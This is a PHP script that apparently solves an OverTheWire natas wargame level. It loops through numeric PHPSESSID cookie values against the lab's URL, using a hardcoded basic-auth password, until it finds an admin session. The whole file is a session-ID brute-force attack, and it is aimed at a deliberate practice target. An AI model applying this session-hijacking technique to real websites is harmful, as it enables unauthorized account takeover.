<?php
$check = function ($sessionId) {
    $ch = curl_init('http://natas18.natas.labs.overthewire.org/index.php?username=admin&password=username%debug=1');
    curl_setopt($ch, CURLOPT_USERPWD, 'natas18:8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    curl_setopt($ch, CURLOPT_COOKIE, 'PHPSESSID=' . $sessionId);

    $output = curl_exec($ch);
    curl_close($ch);
    if (strpos($output, 'You are logged in as a regular user') === false) {
        var_export($output);
        die;
    }
};

for ($i = 1; $i < 641; $i++) {
    echo $i . "\n";
    $check($i);
}